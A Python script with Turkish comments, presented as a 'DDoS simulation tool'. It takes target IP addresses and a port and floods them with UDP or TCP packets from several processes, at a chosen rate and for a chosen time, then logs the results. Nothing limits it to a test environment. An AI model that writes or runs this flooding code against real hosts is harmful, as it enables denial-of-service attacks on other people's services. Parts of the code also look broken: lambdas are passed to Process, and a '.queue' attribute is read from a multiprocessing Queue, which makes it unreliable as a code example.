import socket
import threading
import random
import time
import re
import subprocess
import sys
from multiprocessing import Process, Queue
from datetime import datetime
import os

def install(package):
    """Gerekli kütüphaneyi yükler."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_requirements():
    """Gerekli kütüphaneleri kontrol eder ve yoksa yükler."""
    required_packages = ["numpy", "requests"]
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"{package} kütüphanesi bulunamadı. Yükleniyor...")
            install(package)

def is_valid_ip(ip):
    """IP adresinin geçerliliğini kontrol eder."""
    regex = r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
    return re.match(regex, ip) is not None

def is_valid_port(port):
    """Port numarasının geçerliliğini kontrol eder."""
    return isinstance(port, int) and 1 <= port <= 65535

def udp_attack(target_ip, target_port, duration, attack_rate, payload):
    """UDP saldırısı."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    success_count = 0
    failure_count = 0

    while time.time() < end_time:
        try:
            client.sendto(payload, (target_ip, target_port))
            success_count += 1
            time.sleep(1 / attack_rate)
        except Exception as e:
            print(f"UDP saldırısında hata: {e}")
            failure_count += 1

    return success_count, failure_count

def tcp_attack(target_ip, target_port, duration, attack_rate, payload):
    """TCP saldırısı."""
    end_time = time.time() + duration
    success_count = 0
    failure_count = 0

    while time.time() < end_time:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(1)  # Zaman aşımı ayarı
            client.connect((target_ip, target_port))
            client.send(payload)
            client.close()
            success_count += 1
            time.sleep(1 / attack_rate)
        except socket.timeout:
            print("Bağlantı zaman aşımına uğradı.")
            failure_count += 1
        except Exception as e:
            print(f"TCP saldırısında hata: {e}")
            failure_count += 1

    return success_count, failure_count

def generate_payload(size):
    """Belirtilen boyutta rastgele bir payload oluşturur."""
    return bytes(random.getrandbits(8) for _ in range(size))

def start_attack_process(target_ips, target_port, attack_type, duration, thread_count, attack_rate, payload):
    """Saldırıyı başlatır, ancak çoklu işlem kullanır."""
    processes = []
    results = Queue()

    for ip in target_ips:
        for _ in range(thread_count):
            if attack_type == 'UDP':
                p = Process(target=lambda q, arg1, arg2, arg3, arg4, arg5: q.put(udp_attack(arg1, arg2, arg3, arg4, arg5)),
                             args=(results, ip, target_port, duration, attack_rate, payload))
            else:
                p = Process(target=lambda q, arg1, arg2, arg3, arg4, arg5: q.put(tcp_attack(arg1, arg2, arg3, arg4, arg5)),
                             args=(results, ip, target_port, duration, attack_rate, payload))
            p.start()
            processes.append(p)

    for p in processes:
        p.join()

    total_success = sum(result[0] for result in list(results.queue))
    total_failure = sum(result[1] for result in list(results.queue))

    return total_success, total_failure

def confirm_attack(attack_type, target_ips, target_port):
    """Kullanıcıdan saldırıyı onaylamasını ister."""
    confirmation = input(f"{attack_type} saldırısını {', '.join(target_ips)} IP'lerine, port {target_port} üzerinde başlatmak istiyor musunuz? (E/H): ").strip().upper()
    return confirmation == 'E'

def save_results(success_count, failure_count, attack_type):
    """Sonuçları dosyaya kaydeder."""
    with open("attack_results.txt", "a") as file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        file.write(f"{timestamp} - Saldırı Tipi: {attack_type}, Başarı: {success_count}, Hata: {failure_count}\n")

def get_optimal_thread_count():
    """Kullanıcının sistemine uygun optimal iş parçacığı sayısını alır."""
    return os.cpu_count() * 2  # İki katı kadar thread kullanabiliriz

def main():
    check_requirements()

    print("DDoS Simülasyon Aracı")
    print("=====================")

    try:
        target_ips = input("Hedef IP'leri (virgülle ayırarak girin): ").split(',')
        target_ips = [ip.strip() for ip in target_ips if is_valid_ip(ip.strip())]

        if not target_ips:
            print("Geçerli bir IP adresi giriniz.")
            return

        target_port = int(input("Hedef Port'u girin: "))
        if not is_valid_port(target_port):
            print("Geçersiz port numarası. Lütfen 1-65535 arasında bir değer girin.")
            return

        attack_type = input("Saldırı tipini seçin (UDP/TCP): ").strip().upper()
        while attack_type not in ['UDP', 'TCP']:
            attack_type = input("Geçersiz saldırı tipi. Lütfen 'UDP' veya 'TCP' seçin: ").strip().upper()
        
        thread_count = int(input(f"Kaç iş parçacığı kullanmak istersiniz? (Önerilen: {get_optimal_thread_count()}): ") or get_optimal_thread_count())
        duration = int(input("Saldırının süresini (sn) girin (minimum 5, maksimum 120 saniye): "))
        duration = max(5, min(duration, 120))

        attack_rate = float(input("Saldırı hızını ayarlayın (saniyede gönderilen paket sayısı): "))
        if attack_rate <= 0:
            print("Saldırı hızı 0'dan büyük olmalıdır.")
            return

        # Kullanıcıdan veri yükü alın
        payload = input("Gönderilecek veri yükünü girin (max 1024 byte): ").encode()
        if len(payload) > 1024:
            print("Veri yükü 1024 byte'ı geçemez.")
            return

        if not confirm_attack(attack_type, target_ips, target_port):
            print("Saldırı iptal edildi.")
            return

        print(f"{attack_type} saldırısı başlatıldı. {duration} saniye sürecek.")
        total_success, total_failure = start_attack_process(target_ips, target_port, attack_type, duration, thread_count, attack_rate, payload)

        total_attempts = total_success + total_failure
        success_rate = (total_success / total_attempts) * 100 if total_attempts > 0 else 0
        failure_rate = (total_failure / total_attempts) * 100 if total_attempts > 0 else 0
        
        print("\nSaldırı Sonuçları:")
        print(f"Toplam Başarı: {total_success}, Toplam Hata: {total_failure}")
        print(f"Başarı Oranı: {success_rate:.2f}%, Hata Oranı: {failure_rate:.2f}%")

        save_results(total_success, total_failure, attack_type)
        print("Sonuçlar attack_results.txt dosyasına kaydedildi.")
        
    except ValueError as e:
        print(f"Geçersiz giriş: {e}")
    except Exception as e:
        print(f"Hata: {e}")

if __name__ == "__main__":
    main()